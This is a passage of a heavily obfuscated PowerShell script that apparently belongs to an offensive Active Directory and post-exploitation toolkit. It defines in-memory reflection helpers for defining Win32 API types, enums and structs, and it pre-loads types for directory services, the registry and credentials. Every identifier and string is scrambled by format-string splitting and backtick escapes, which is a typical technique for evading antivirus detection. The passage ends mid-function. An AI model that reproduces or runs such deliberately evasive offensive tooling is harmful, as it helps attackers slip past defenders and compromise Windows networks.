 &("{0}{1}{2}"-f 'Set','-',("{0}{1}" -f 'IT','Em'))  (("{0}{1}" -f 'vARI','a')+("{2}{0}{1}"-f 'e',':0o','bL')+("{1}{0}" -f 'Uqj','l'))  (  [TYPE]("{1}{0}"-f'iD','GU'));  &("{0}{3}{1}{2}"-f 's','-va',("{0}{1}"-f 'r','IaBlE'),'ET') ("dx7"+"U"+"Mj")  ( [TyPe]("{2}{1}{0}" -f 'in',("{1}{0}"-f'MA','DO'),'aPp')  );  ${C64d`Tj} =[tYpe]("{4}{2}{1}{6}{3}{5}{0}" -F'iON',("{1}{0}" -f'Ces.cAl','I'),("{3}{0}{1}{2}" -f'intERoPs','E','RV','ntIMe.'),("{0}{1}"-f 'c','onVeN'),'RU','t',("{1}{0}"-f'Ng','li'));   &("{1}{0}" -f ("{0}{1}" -f '-','itEM'),'Set')  ("{0}{2}{3}{1}" -f 'VAR','G0','ia','Ble:Z') ( [tYpe]("{0}{1}{4}{3}{6}{2}{5}" -f 'rUn',("{1}{0}{2}{3}" -f'me.','Ti','iNTER','o'),'Rse',("{3}{1}{2}{0}" -f'cH','v','ices.','SER'),'p','T','A') )  ;    ${z8`4N}  =  [tyPE]("{8}{10}{1}{5}{4}{9}{7}{0}{3}{6}{2}" -F 'at',("{3}{1}{2}{0}"-f 'ER','ntE','RopS','ME.I'),'Te','tRi','.',("{1}{0}" -f 'CEs','vI'),'BU',("{0}{1}" -f 'im','poRt'),'R','dLL',("{0}{1}" -f 'Unt','i')); &('SV') ("{1}{0}" -f 'JW','c1')  (  [TYpe]("{1}{0}{2}{4}{3}"-f'SAt',("{0}{1}"-f'f','Lag'),'tri','uTE','b'));  &("{1}{2}{0}"-f'm','sE',("{0}{1}" -f 'T','-itE'))  ("{0}{3}{2}{1}" -f 'V','12','lE:94T','AriAb') ([Type]("{1}{3}{2}{4}{0}"-F("{1}{0}{2}"-f 'nGsi','I','Ze'),("{0}{1}" -f'REFL','eC'),("{1}{0}" -f'iT.','m'),("{0}{1}"-f 'TIO','N.e'),("{1}{0}" -f 'ACk','p')) ) ; ${I`xh}  =[tyPe]("{2}{4}{3}{6}{1}{0}{5}" -F 'rI',("{1}{0}" -f'T','EAT'),'Re','t',("{0}{1}{2}"-f 'F','LECt','Ion.'),("{0}{1}" -f 'BUT','ES'),'Yp')  ;${k`dPe}=  [tYpe]("{2}{3}{1}{4}{6}{5}{8}{0}{7}"-f("{1}{2}{0}" -f 'ib','SA','TtR'),("{0}{1}"-f 'TiMe.','iNT'),'Ru','N',("{1}{0}" -f 'Ps','ERO'),("{2}{0}{1}" -f'S.mArSh','A','E'),("{0}{1}"-f 'e','rvIC'),'utE','lA'); &("{0}{2}{1}" -f'S',("{0}{1}"-f 'IT','Em'),'eT-') ("{3}{1}{2}{0}"-f'blE:Ho35','AR','Ia','V') ([tYPE]("{0}{1}" -f'T','YPE') ) ;  &("{1}{2}{0}"-f 'm','se',("{1}{0}"-f 'Te','T-I')) ("vAr"+("{0}{1}"-f 'i','AbL')+"E"+("{0}{1}" -f':8s','G'))  ( [tYPE]("{5}{2}{0}{1}{3}{4}" -F'IN','t',("{2}{1}{0}"-f'Ime.','t','uN'),("{0}{1}" -f'eR','oPSeRV'),("{3}{1}{2}{0}"-f 'sHAL','S','.MAR','icE'),'R') );  ${5a`37} = [typE]("{0}{3}{1}{2}" -f ("{1}{0}{2}"-f'e','reFL','cTIO'),("{1}{0}" -f 'De','PcO'),'S',("{0}{2}{1}"-f'n.eMI','.o','T'))  ;  &('Sv')  ("{1}{0}" -f 'c','57') ([typE]("{1}{0}" -f("{1}{0}" -f'S','T.dn'),'ne')  )  ;  ${9`2m}= [TYpE]("{2}{5}{3}{4}{0}{1}"-F("{1}{0}" -f 'iS','Reg'),("{0}{1}"-f'tR','yKeY'),'MI',("{1}{0}"-f'.wi','fT'),("{0}{1}" -f'n','32.'),("{0}{1}" -f'crO','sO'));  &("{1}{2}{0}" -f("{0}{1}" -f 'Ar','IAbLE'),("{1}{0}" -f't-','se'),'v')  ("{1}{0}"-f'w9tP','be') ([tyPe]("{6}{0}{4}{8}{7}{1}{2}{5}{3}" -f'M.','d','iNg','gS',("{1}{0}" -f'lE','rEF'),'flA',("{0}{1}"-f'SyST','E'),'n',("{1}{0}"-f 'Bi','CtiOn.'))) ;    &("{0}{1}" -f ("{1}{0}" -f'et-','S'),("{1}{0}" -f'M','Ite'))  ("{0}{3}{2}{1}" -f'VA','U0Wq','ABLE:a','RI')  ([TyPe]("{5}{0}{7}{1}{4}{8}{6}{2}{3}" -F ("{1}{2}{0}"-f'di','ystE','M.'),'v','DOM','aIn',("{0}{1}" -f'ICE','s'),'S',("{0}{2}{1}" -f'RECt','Y.','or'),("{3}{2}{0}{1}" -f'E','r','yS','rEcToR'),("{2}{0}{1}" -f'ct','IvEdi','.a')) )  ;&("{0}{2}{1}" -f'SE','M',("{0}{1}" -f 't-','iTe')) ("{0}{1}{2}{4}{3}" -f'vaRI','A','bLE','GJB',':X4y')  ([tyPe]("{7}{8}{9}{1}{5}{3}{6}{12}{11}{0}{10}{2}{4}{13}" -f'ory','sE','O','Ce','RE','RVi',("{1}{2}{0}"-f'I','S.a','ct'),'s',("{3}{1}{0}{2}" -f 'IrE','sTeM.D','c','y'),("{0}{1}" -f'To','RY'),'.f',("{1}{0}"-f'Ct','re'),("{0}{1}"-f'v','Edi'),'sT')  );&("{2}{1}{0}" -f 'm','tE',("{1}{0}"-f 'eT-i','S'))  (("{0}{1}"-f'vAR','i')+'a'+("{1}{0}{2}"-f 'E','bL',':b78k'))  ( [typE]("{0}{1}{4}{3}{2}"-F ("{0}{1}"-f 'SYs','t'),'em.',("{2}{0}{1}"-f'Di','ng','NcO'),'t.e','TeX')) ;    &("{0}{2}{1}"-f 'SE','EM',("{1}{0}"-f 't','T-I'))  ("{1}{3}{0}{2}" -f'E','VAriA',':2odjZ9','bl') (  [TyPE]("{2}{1}{0}{4}{3}" -f'Net',("{0}{1}"-f's','TEM.'),'SY','s','.dN') ) ;${s`ia}  = [tyPe]("{1}{0}" -F 'iLe',("{1}{0}" -f 'F','io.'));   ${c`43j} = [TypE]("{3}{1}{8}{9}{4}{7}{0}{6}{5}{10}{2}" -f("{1}{0}{2}" -f 'iOn.RuNs','T','Pace'),'Y','te','s',("{1}{0}" -f'M','t.auTO'),("{0}{1}" -f 'ssIO','Ns'),("{0}{1}{2}" -f 's','.iNItI','alSe'),'A','ST',("{3}{2}{0}{1}"-f 'MAnagemE','n','m.','E'),'TA')  ; ${0k`BL}  = [TYpE]("{2}{5}{4}{3}{1}{0}"-F ("{1}{0}" -f'd','rEa'),("{2}{1}{0}" -f 'H','t','iNG.'),("{1}{0}"-f'St','SY'),'D','ea',("{0}{1}" -f 'Em','.THr')) ;&("{1}{0}"-f 't','sE')  (("{1}{0}"-f'naI','XG')+'b') ([tYpE]("{3}{0}{4}{1}{2}" -f("{0}{1}"-f'ns','PaCeF'),'c',("{0}{1}" -f 'Tor','Y'),'ru','a') )  ;    ${B`7f`IC}=  [tYPE]("{2}{1}{0}" -F 'll',("{0}{1}"-f 'We','RsHe'),'pO')  ;  &('sV') ("{1}{0}" -f 'vbN','z3s')  ( [TYpE]("{0}{3}{1}{2}" -F ("{1}{0}{2}"-f 'Nvir','e','ON'),'E','nt','m') )  ;&("{2}{1}{0}" -f'Em',("{0}{1}" -f'T-I','t'),'sE')  ("vA"+("{0}{1}"-f'ria','b')+"le"+("{1}{0}" -f 'mbI',':5'))  (  [tYpE]("{0}{1}"-F("{0}{1}"-f'daT','Et'),'Ime') ) ; &("{0}{1}{2}" -f's',("{0}{1}"-f 'ET-iT','e'),'M')  (("{0}{1}"-f 'VA','Ri')+("{0}{1}"-f'ab','le')+("{0}{1}"-f':t65','Pi'))  (  [TYPE]("{4}{7}{2}{1}{5}{0}{3}{6}{8}" -f ("{0}{1}{2}" -f'Oma','t','IO'),("{1}{0}" -f'aU','T.'),("{1}{0}"-f 'MEn','nAGe'),("{1}{0}" -f 'pS','N.'),("{1}{0}{2}" -f 'em','SYsT','.'),'t',("{1}{2}{0}"-f'ntI','Cr','EdE'),'mA','aL'))  ;  &("{1}{0}"-f("{0}{1}" -f 'iTe','M'),("{1}{0}" -f 'Et-','S'))  ("Var"+("{0}{1}"-f 'iab','LE:')+("{1}{0}"-f'gp','Cr')+"0")  ( [tYpE]("{0}{1}{2}" -F("{0}{1}" -f'iO','.dIrE'),("{0}{1}" -f'C','ToR'),'y'));  ${lC`Sg}  =  [Type]("{0}{1}"-F 'C',("{0}{2}{1}"-f 'On','rT','ve'))  ;   &('Sv') ("{1}{0}" -f'Qg','S')  (  [tYpe]("{0}{1}"-F 'inT','PTr')) ;  &("{0}{1}"-f("{0}{1}"-f 'SeT-iT','e'),'m') ("{2}{1}{0}{3}"-f'lE','IaB','var',':mp6')  ([Type]("{1}{0}"-F("{1}{0}" -f 't32','n'),'I') ) ; 











function new-I`N`Me`moRy`MO`DULe
{


    Param
    (
        [Parameter(POsition = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${MoDu`LEN`AMe} =   ${0`Olu`QJ}::("{1}{2}{0}"-f ("{0}{1}" -f 'G','uid'),'Ne','w')."I`Nv`okE"().("{1}{0}" -f ("{0}{1}" -f 'oStr','ing'),'T')."InVO`Ke"()
    )

    ${lOad`E`d`ASsE`mBlIeS} =  ( &("{0}{1}{2}"-f'chI',("{1}{0}" -f 'E','ldit'),'m')  ("vAR"+("{0}{1}" -f 'iAB','lE:')+("{0}{1}"-f'DX7','U')+"mj")  )."VA`lUE"::"Cu`RRe`NTd`OmA`in".("{0}{1}{2}"-f ("{0}{1}"-f'Get','A'),("{0}{1}"-f'sse','m'),("{1}{0}" -f'ies','bl'))."I`NVOKE"()

    ForEach (${As`seMbly} in ${L`O`AD`EDas`SEMBLI`Es}) {
        if (${As`SEMB`ly}."f`ULlN`AME" -and (${AsseMB`ly}."F`UL`lnaMe".("{0}{1}" -f 'S',("{0}{1}"-f'pli','t'))."I`NV`oKe"(',')[0] -eq ${MO`D`UlENamE})) {
            return ${a`ssE`MBLy}
        }
    }

    ${DynA`sse`m`BLy} = &("{0}{1}{2}"-f'N',("{1}{0}"-f'j','ew-Ob'),'ect') ("{4}{1}{0}{3}{2}" -f ("{0}{1}" -f'le','ct'),'f',("{2}{1}{3}{0}"-f'lyName','ss','A','emb'),("{0}{1}"-f 'i','on.'),'Re')(${mOD`U`l`EnAME})
    ${D`omAIn} =  ${d`x7UMj}::"cUrrE`Nt`DomaiN"
    ${a`sS`EmbLy`B`UilDEr} = ${DOm`AIn}.("{3}{1}{4}{0}{2}" -f 'bl',("{0}{1}{2}"-f 'nam','icAss','e'),'y',("{0}{2}{1}"-f'De','eDy','fin'),'m')."iN`V`Oke"(${d`y`NassE`mbLy}, 'Run')
    ${MO`dul`e`BuiLDer} = ${asSEmbL`YB`U`ILd`eR}.("{1}{4}{2}{0}{3}" -f'cM','D','ami',("{0}{1}" -f 'odu','le'),("{2}{0}{1}"-f'neD','yn','efi'))."In`VOKe"(${m`OduLe`NAME}, ${fA`l`Se})

    return ${m`OdU`L`eBU`ILder}
}




function fu`Nc
{
    Param
    (
        [Parameter(pOsiTion = 0, MaNdATOry = ${T`RuE})]
        [String]
        ${DL`l`Name},

        [Parameter(PoSITiOn = 1, MANdAToRY = ${tr`UE})]
        [String]
        ${FUnCTi`ONn`A`mE},

        [Parameter(posiTIon = 2, mANdAtorY = ${Tr`Ue})]
        [Type]
        ${rEtu`Rn`TYpe},

        [Parameter(pOsITiON = 3)]
        [Type[]]
        ${p`Ar`AM`e`TerTYpEs},

        [Parameter(PosiTIOn = 4)]
        [Runtime.InteropServices.CallingConvention]
        ${nat`IVecA`l`LinG`cOnVEnTiON},

        [Parameter(POsITiON = 5)]
        [Runtime.InteropServices.CharSet]
        ${cHA`RsET},

        [Switch]
        ${s`ETLaSTe`RROR}
    )

    ${Pr`O`PeRTieS} = @{
        ("{0}{1}"-f("{0}{1}" -f 'DllNa','m'),'e') = ${d`llNa`me}
        ("{0}{2}{1}{3}" -f ("{1}{0}" -f 'ti','Func'),'nNa','o','me') = ${fUnCt`iO`NnAMe}
        ("{3}{0}{2}{1}"-f 'rnT','pe','y',("{1}{0}"-f'u','Ret')) = ${re`TURNt`Ype}
    }

    if (${PaRA`meTER`TY`pes}) { ${pR`Op`E`RtIeS}[("{3}{1}{2}{0}" -f'pes',("{0}{1}" -f'eter','T'),'y',("{1}{0}"-f 'aram','P'))] = ${pA`Ra`m`et`ERtYpEs} }
    if (${n`A`TIVeCAlLing`ConV`enTIOn}) { ${pr`oPErtI`ES}[("{1}{6}{2}{5}{0}{3}{4}" -f 'gCo','N',("{1}{0}"-f 'li','Cal'),("{1}{0}"-f 'vent','n'),'ion','n',("{1}{0}"-f 'tive','a'))] = ${na`TIvec`Alling`cONVe`N`TiOn} }
    if (${C`hAr`sEt}) { ${p`RoPE`RT`IeS}[("{2}{0}{1}" -f 'ha',("{0}{1}" -f 'r','set'),'C')] = ${Cha`RSEt} }
    if (${SETLaSTe`RR`Or}) { ${PRo`p`eR`TieS}[("{1}{3}{2}{0}"-f 'r',("{1}{0}"-f 'tLa','Se'),'ro',("{1}{0}"-f 'Er','st'))] = ${s`ETLasTe`RROR} }

    &("{2}{0}{1}"-f 'w',("{0}{1}" -f '-Obje','ct'),'Ne') ("{1}{0}{2}"-f ("{0}{1}"-f'S','Obje'),'P','ct') -Property ${pROPE`Rt`I`ES}
}


function a`dd`-WiN3`2`TYPe
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(MANdaToRY = ${t`RuE}, vALUEfrOmPipEliNeByPROPERtyNaME = ${T`RUe})]
        [String]
        ${dlL`NA`Me},

        [Parameter(MAndaTorY = ${tR`UE}, vAlUeFRoMpipELIneByPRoPERtynAMe = ${TR`Ue})]
        [String]
        ${fUnc`Tio`NNA`Me},

        [Parameter(MANdaToRy = ${TR`UE}, vAluefRomPIpeLINebYprOPertynamE = ${TR`UE})]
        [Type]
        ${ReT`U`R`NtyPe},

        [Parameter(valuefrOMPiPElinEbypRopeRtynAme = ${tr`Ue})]
        [Type[]]
        ${paRam`Et`e`RTYP`es},

        [Parameter(valUEfROmpipElinEByProPErTYNaMe = ${T`Rue})]
        [Runtime.InteropServices.CallingConvention]
        ${NATI`V`eC`ALL`in`GcoNVeNT`iOn} =   ( &("{1}{0}" -f'em','IT')  ('vAr'+'iA'+("{0}{1}"-f 'ble',':c')+("{1}{0}" -f 'J','64Dt'))  )."VA`lUE"::"St`DCA`Ll",

        [Parameter(ValuEFRoMPIpeLinEByPROpERTYnAme = ${tr`UE})]
        [Runtime.InteropServices.CharSet]
        ${ChAr`S`et} =   ( &("{2}{3}{0}{1}"-f'a','blE',("{1}{0}" -f 'Et-v','G'),'aRi') ("{1}{0}"-f'0','zG') -VA)::"Au`TO",

        [Parameter(VAluEfROMPipElINebyProPerTYNaMe = ${T`RuE})]
        [Switch]
        ${SeTLa`sterR`oR},

        [Parameter(mAnDaTory = ${t`RUe})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${Mo`duLe},

        [ValidateNotNull()]
        [String]
        ${naMe`s`p`AcE} = ''
    )

    BEGIN
    {
        ${t`YPE`hash} = @{}
    }

    PROCESS
    {
        if (${MOdu`lE} -is [Reflection.Assembly])
        {
            if (${nA`mESP`AcE})
            {
                ${T`yPE`HasH}[${d`lLN`Ame}] = ${M`OdUle}.("{0}{2}{1}"-f'Ge','pe','tTy')."I`NVoKE"("$Namespace.$DllName")
            }
            else
            {
                ${t`Y`PeHa`SH}[${dll`Na`ME}] = ${m`ODU`lE}.("{2}{1}{0}"-f 'e','Typ','Get')."I`N`Voke"(${DlLN`A`me})
            }
        }
        else
        {
            
            if (!${TYP`eh`AsH}.("{3}{1}{2}{0}" -f 'y','on',("{0}{1}"-f 't','ainsKe'),'C')."i`NvOKE"(${d`LL`NAMe}))
            {
                if (${N`AmesPA`CE})
                {
                    ${tyP`EHa`sH}[${DLlN`A`ME}] = ${MoD`UlE}.("{2}{1}{0}"-f 'pe','eTy',("{1}{0}" -f 'n','Defi'))."InVO`KE"("$Namespace.$DllName", ("{3}{4}{0}{1}{2}"-f ("{1}{2}{0}" -f'foreFi','B','e'),("{0}{1}" -f 'eldI','n'),'it','P',("{0}{1}" -f'ublic',',')))
                }
                else
                {
                    ${tYP`eHa`Sh}[${DL`L`NAmE}] = ${MODu`LE}.("{1}{0}{2}"-f 'T',("{0}{1}"-f 'D','efine'),'ype')."i`NV`OkE"(${D`l`LnAME}, ("{2}{3}{1}{0}{4}{5}"-f ("{1}{2}{0}"-f'efo','c,','B'),'bli','P','u',("{0}{1}" -f 'reF','ie'),("{2}{1}{0}"-f 'nit','I','ld')))
                }
            }

            ${met`hoD} = ${tYp`e`hAsH}[${dLL`NamE}].("{2}{0}{3}{1}"-f ("{0}{1}"-f'ef','in'),("{0}{1}" -f 'M','ethod'),'D','e')."in`VOkE"(
                ${F`UnCTi`ON`NamE},
                ("{2}{0}{4}{3}{1}" -f("{2}{1}{0}" -f',P','tic','a'),'mpl',("{0}{1}{2}" -f'Pub','li','c,St'),'keI',("{0}{1}"-f 'inv','o')),
                ${rE`TUrnt`yPe},
                ${P`ArA`m`EtER`TypeS})

            
            ${I} = 1
            ForEach(${P`AraME`TeR} in ${PaRA`met`ertY`pes})
            {
                if (${p`A`RAmET`er}."I`SB`Yref")
                {
                    [void] ${M`EthoD}.("{0}{2}{1}{3}" -f'De',("{2}{0}{1}" -f 'arame','te','neP'),'fi','r')."I`NvOkE"(${i}, 'Out', ${N`UlL})
                }

                ${I}++
            }

            ${dlliM`P`oRt} = [Runtime.InteropServices.DllImportAttribute]
            ${S`ETLASTe`R`RO`RFiElD} = ${d`lLi`mp`Ort}.("{0}{1}" -f ("{0}{1}" -f 'GetFi','e'),'ld')."inV`O`ke"(("{1}{0}{2}"-f ("{0}{1}"-f'e','tLast'),'S',("{1}{0}" -f'r','Erro')))
            ${c`A`l`Li`NGCONve`NtiONF`I`eld} = ${D`lLiMpo`RT}.("{1}{0}{2}"-f'F','Get',("{0}{1}" -f 'iel','d'))."i`N`VoKe"(("{3}{1}{2}{0}" -f ("{0}{1}{2}" -f'nve','nt','ion'),'g','Co',("{0}{1}" -f 'C','allin')))
            ${ch`ArSETFI`elD} = ${DlLI`M`PoRT}.("{0}{1}{2}"-f ("{0}{1}" -f'Ge','tF'),'ie','ld')."iNv`oKe"(("{0}{2}{1}"-f'C',("{0}{1}" -f 'a','rSet'),'h'))
            if (${S`ET`la`SteRr`or}) { ${SL`E`V`AluE} = ${T`Rue} } else { ${sLEVal`Ue} = ${FA`LSe} }

            
            ${c`onst`RUcToR} =  ${z8`4n}."get`cONS`TRuc`T`oR"([String])
            ${D`LLI`m`port`A`TTrIbuTe} = &("{1}{0}{2}" -f("{1}{0}" -f'je','-Ob'),'New','ct') ("{1}{5}{6}{2}{3}{0}{4}"-f 'ld','Re','u','i','er',("{0}{2}{1}{3}"-f 'flect','n','io','.Em'),("{0}{3}{2}{1}" -f 'it.CustomAttr','B','ute','ib'))(${CONS`Tru`CTOr},
                ${Dl`LN`Ame}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(${SEtL`ASt`ER`R`oRfI`elD}, ${CaLLInGcO`NVeN`TIo`Nfie`LD}, ${Ch`ARs`E`Tf`ield}),
                [Object[]] @(${slEv`A`lue}, ([Runtime.InteropServices.CallingConvention] ${n`A`TiV`ecAlLin`gcon`V`eNTION}), ([Runtime.InteropServices.CharSet] ${Ch`A`RsEt})))

            ${mEt`Hod}.("{2}{0}{4}{3}{1}{5}" -f("{0}{1}" -f'etC','ust'),'tt','S','A','om',("{1}{0}"-f 'ute','rib'))."In`VoKe"(${D`LlI`mporT`ATTR`I`B`UtE})
        }
    }

    END
    {
        if (${MO`duLe} -is [Reflection.Assembly])
        {
            return ${typE`hA`Sh}
        }

        ${rE`TurNt`y`pes} = @{}

        ForEach (${K`Ey} in ${TY`pe`HASh}."k`eYs")
        {
            ${Ty`pe} = ${tYpeh`AsH}[${K`EY}].("{2}{0}{1}"-f 'eT','ype',("{0}{1}"-f'Cre','at'))."in`Vo`KE"()

            ${re`TuRNTy`pEs}[${K`ey}] = ${ty`pe}
        }

        return ${R`et`UrnTYpes}
    }
}


function P`S`eNUM
{


    [OutputType([Type])]
    Param
    (
        [Parameter(posITION = 0, MandAtoRy = ${tR`UE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${MOdu`lE},

        [Parameter(pOSitION = 1, mAnDAtORY = ${T`RUe})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${FULl`N`Ame},

        [Parameter(PosITiON = 2, maNDatOry = ${T`Rue})]
        [Type]
        ${Ty`PE},

        [Parameter(posITiOn = 3, maNDATOrY = ${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${EnUmE`LeM`ENTS},

        [Switch]
        ${Bi`TF`ielD}
    )

    if (${MOd`U`le} -is [Reflection.Assembly])
    {
        return (${m`oDULe}.("{1}{0}"-f ("{0}{1}" -f 'Ty','pe'),'Get')."i`NVoke"(${F`ULl`N`AmE}))
    }

    ${En`UmTy`PE} = ${T`Ype} -as [Type]

    ${EnuM`BU`ildER} = ${Mo`DU`le}.("{1}{2}{0}"-f("{0}{1}"-f 'eEnu','m'),("{0}{1}" -f 'De','fi'),'n')."i`Nvoke"(${f`U`lLNaME}, ("{1}{0}" -f'ic',("{0}{1}"-f'P','ubl')), ${e`NumT`ype})

    if (${biTF`iE`Ld})
    {
        ${fLAG`S`coN`s`TrUcTOR} =   ( &("{1}{2}{0}"-f("{0}{1}"-f'ABl','e'),'V','ARi')  ("{0}{1}" -f'C1J','W') )."va`Lue"."GE`TCONST`RU`cT`Or"(@())
        ${FL`AG`Sc`UsT`oMAT`TRiButE} = &("{2}{1}{0}"-f("{1}{0}{2}" -f 'bj','w-O','ect'),'e','N') ("{6}{9}{2}{7}{4}{5}{8}{0}{10}{1}{3}"-f 'b','B','ct',("{2}{1}{0}" -f'r','de','uil'),("{1}{0}" -f '.C','Emit'),("{0}{1}" -f 'us','tomA'),'Ref',("{1}{0}" -f'on.','i'),("{0}{1}"-f't','tri'),'le','ute')(${f`lAGS`COnSTRUC`TOr}, @())
        ${eN`UM`BU`ilDER}.("{1}{4}{3}{0}{2}" -f'bu',("{1}{0}"-f 'Cus','Set'),'te',("{1}{0}" -f 'tri','At'),'tom')."IN`VokE"(${F`lAGSCU`STOMAt`TrIbUTe})
    }

    ForEach (${k`Ey} in ${en`Um`elEMEnTS}."Ke`YS")
    {
        
        ${nU`ll} = ${EnUm`Bu`iLd`Er}."defIN`ELI`TE`Ral"(${k`eY}, ${e`NuME`le`mEn`TS}[${K`ey}] -as ${Enumt`Y`pe})
    }

    ${enUmB`UI`lD`Er}.("{1}{2}{0}{3}" -f("{0}{1}"-f't','eTyp'),'Cr','ea','e')."invo`kE"()
}




function f`iE`LD
{
    Param
    (
        [Parameter(poSITion = 0, ManDaTOrY = ${TR`UE})]
        [UInt16]
        ${p`OsIT`iOn},

        [Parameter(pOsItiOn = 1, MandatOry = ${tR`UE})]
        [Type]
        ${t`ype},

        [Parameter(POsItION = 2)]
        [UInt16]
        ${O`Ff`Set},

        [Object[]]
        ${maRsH`A`Las}
    )

    @{
        PoSItion = ${pOs`ITi`oN}
        ("{0}{1}" -f 'T','ype') = ${ty`Pe} -as [Type]
        ("{1}{0}" -f ("{1}{0}" -f 'fset','f'),'O') = ${Off`SET}
        ("{1}{0}" -f ("{1}{0}" -f'lAs','a'),("{0}{1}" -f'M','arsh')) = ${MarS`haL`AS}
    }
}


function s`TR`UCT
{


    [OutputType([Type])]
    Param
    (
        [Parameter(posiTion = 1, mANDAtOrY = ${Tr`Ue})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${MOd`Ule},

        [Parameter(POSItioN = 2, MANDaTOry = ${t`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Ful`L`Name},

        [Parameter(pOsiTiOn = 3, MaNdatORy = ${t`RUE})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${st`RucT`FIElDS},

        [Reflection.Emit.PackingSize]
        ${P`A`CkinGsizE} =  (  &("{2}{0}{1}" -f'A','Ble',("{0}{1}" -f'V','ari'))  ("{0}{1}" -f'94T1','2') )."v`Alue"::"U`Ns`P`EcIfieD",

        [Switch]
        ${e`X`plICI`TlAyOUt}
    )

    if (${mo`DU`lE} -is [Reflection.Assembly])
    {
        return (${MO`Dule}.("{0}{1}" -f ("{0}{1}" -f'G','etT'),'ype')."in`V`okE"(${f`U`llnAme}))
    }

    [Reflection.TypeAttributes] ${StRUCTAT`T`RIb`UT`eS} = ("{2}{1}{3}{10}{9}{17}{5}{16}{12}{14}{19}{13}{18}{8}{6}{11}{15}{0}{7}{4}" -f ("{0}{1}"-f're','Fie'),'las',("{0}{1}"-f'A','nsiC'),("{0}{1}{3}{2}"-f's',',
','     ','   '),("{1}{0}" -f 't','Ini'),("{0}{1}" -f'  ','  '),'   ','ld',' ',("{1}{0}" -f 'bli',' Pu'),("{3}{0}{2}{1}" -f'   ',' ',' ','Class,
  '),'B','al','  ','ed','efo',("{0}{1}"-f'  ','Se'),("{1}{0}" -f '
  ','c,'),'  ',',
')

    if (${E`XplIC`it`LA`YOut})
    {
        ${sTRuC`T`AtT`RibUTeS} = ${St`Ruc`T`ATTRIb`Utes} -bor  (&('lS') ("{1}{0}{2}" -f 'RiabLE:','VA','iXh') )."vAl`UE"::"E`XP`LIcItL`AyOUt"
    }
    else
    {
        ${ST`Ru`CTaTt`RIBuTeS} = ${st`RU`cTaT`Tr`ibUt`es} -bor   (  &('Ls') ("{2}{1}{0}" -f'ixh','e:','vARIABL')  )."VAL`Ue"::"S`eq`UEnTia`lLAY`o`UT"
    }

    ${s`TrUctbUI`L`d`Er} = ${MOd`ULE}."D`efInet`yPE"(${fULL`N`AmE}, ${S`T`RUCt`ATTr`ibuTeS}, [ValueType], ${pAcki`N`GS`ize})
    ${c`onS`TrUCtOR`iNFo} =  ${k`DPE}.("{0}{4}{3}{1}{2}" -f 'Get','o','rs','t',("{1}{0}" -f 'truc','Cons'))."i`NVoke"()[0]
    ${si`zeC`onST} = @(  (  &("{0}{1}{2}"-f 'Ge','t-I','tEM') (("{1}{2}{0}"-f'abl','v','ari')+'e:'+("{1}{0}"-f'E','kDP')))."VAL`UE".("{0}{1}" -f'G',("{0}{1}{2}"-f'et','Fi','eld'))."iNV`oKe"(("{2}{1}{0}" -f'st',("{0}{1}" -f 'eC','on'),'Siz')))

    ${fi`el`dS} = &("{0}{1}{2}" -f ("{0}{1}" -f'Ne','w-O'),'bj','ect') ("{3}{1}{2}{0}" -f'[]','hta','ble','Has')(${s`TruCtF`ieLds}."CO`UNt")

    
    
    
    ForEach (${fi`E`Ld} in ${STR`UctF`iel`ds}."K`EyS")
    {
        ${iNd`EX} = ${strUc`T`F`iElds}[${f`IelD}][("{1}{0}" -f ("{0}{1}"-f 'osit','ion'),'P')]
        ${fi`eL`Ds}[${i`N`deX}] = @{("{1}{0}{2}"-f'l','Fie',("{1}{0}"-f'ame','dN')) = ${F`ie`ld}; ("{0}{2}{1}" -f 'Pro','es',("{1}{0}" -f'i','pert')) = ${s`TR`UCtFieLds}[${F`iE`Ld}]}
    }

    ForEach (${f`I`ELd} in ${f`IELdS})
    {
        ${F`ieLdNA`Me} = ${fIE`lD}[("{2}{0}{1}"-f 'dNa','me',("{0}{1}" -f 'Fi','el'))]
        ${f`I`ELDp`ROP} = ${fi`E`ld}[("{3}{2}{1}{0}" -f'ies','rt','ope','Pr')]

        ${o`FFs`eT} = ${f`IE`LDPRop}[("{2}{1}{0}" -f't',("{0}{1}" -f 'f','fse'),'O')]
        ${T`yPE} = ${FieLdp`R`op}[("{0}{1}" -f'Typ','e')]
        ${m`Ars`hAlAS} = ${FieL`DP`R`oP}[("{2}{1}{0}"-f'lAs','ha',("{0}{1}"-f 'Mar','s'))]

        ${N`E`WfiElD} = ${STruc`TbU`il`der}.("{1}{2}{0}" -f 'ld','Def',("{2}{0}{1}" -f'F','ie','ine'))."I`NvokE"(${F`iEld`Name}, ${TY`PE}, ("{0}{1}" -f 'Pub','lic'))

        if (${MAR`Sha`LaS})
        {
            ${u`N`MaNag`ED`TYPe} = ${MarSHa`L`AS}[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (${MArS`Ha`LAs}[1])
            {
                ${sI`ze} = ${ma`RSHaL`AS}[1]
                ${a`Ttr`ibBu`IldER} = &("{0}{1}{2}" -f ("{1}{0}"-f'-O','New'),'bj','ect') ("{1}{6}{10}{2}{0}{9}{5}{3}{8}{7}{4}"-f'mit','Ref','n.E','t',("{1}{0}"-f 'lder','ui'),("{0}{2}{1}" -f 'Cust','At','om'),("{1}{0}"-f 'i','lect'),'teB',("{0}{1}"-f 'r','ibu'),'.','o')(${c`oNSt`R`Uc`TorInfO},
                    ${Unm`A`N`AGedtYpE}, ${s`IZE`CoNSt}, @(${sI`zE}))
            }
            else
            {
